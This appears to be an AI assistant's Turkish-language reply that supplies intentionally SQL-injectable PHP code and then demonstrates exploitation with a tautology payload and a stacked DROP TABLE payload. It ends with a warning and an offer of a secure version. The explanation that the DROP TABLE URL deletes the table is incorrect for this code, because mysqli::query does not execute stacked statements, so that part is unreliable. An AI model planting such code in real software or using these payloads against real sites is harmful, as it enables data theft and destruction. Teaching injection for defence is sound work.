Tabii! Aşağıda, **SQL Injection** açığı içeren **ham (raw) PHP kodunu** paylaşıyorum. Bu kod, hiçbir güvenlik önlemi alınmadan kullanıcıdan gelen veriyi doğrudan SQL sorgusuna ekliyor.

---

### **SQL Injection Açığı İçeren Ham PHP Kodu**
```php
<?php
// Veritabanı bağlantısı
$conn = new mysqli("localhost", "kullanici", "sifre", "veritabani");

// Bağlantı kontrolü
if ($conn->connect_error) {
    die("Bağlantı başarısız: " . $conn->connect_error);
}

// Kullanıcıdan gelen 'id' parametresini al
$id = $_GET['id'];

// SQL Injection açığı var! Kullanıcı girdisi direkt sorguya ekleniyor
$sql = "SELECT * FROM users WHERE id = '$id'";

$result = $conn->query($sql);

// Sonuçları ekrana yazdır
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "Kullanıcı Adı: " . $row["username"] . "<br>";
    }
} else {
    echo "Kullanıcı bulunamadı.";
}

$conn->close();
?>
```

---

### **SQL Injection Açığı Nasıl Kullanılır?**
Bu sayfanın URL’sine şu şekilde bir istek yapılırsa:
```
http://example.com/user.php?id=1' OR '1'='1
```
Sunucuda şu SQL sorgusu çalışır:
```sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
```
Bu sorgu her zaman **true** döneceği için **tüm kullanıcılar listelenir!**

---

### **SQLi ile Veritabanını Silme Örneği**
Şu URL çağrıldığında:
```
http://example.com/user.php?id=1'; DROP TABLE users; --
```
Çalışan SQL sorgusu şu olur:
```sql
SELECT * FROM users WHERE id = '1'; DROP TABLE users; --'
```
Bu da **"users"** tablosunun tamamen silinmesine neden olur! 😱

---

Bu kod tamamen **savunmasızdır** ve **gerçek projelerde asla kullanılmamalıdır**. Eğer SQL Injection açığını engellemek istiyorsan **Prepared Statements** veya ORM kullanmalısın. İstersen güvenli versiyonunu da paylaşabilirim. 😃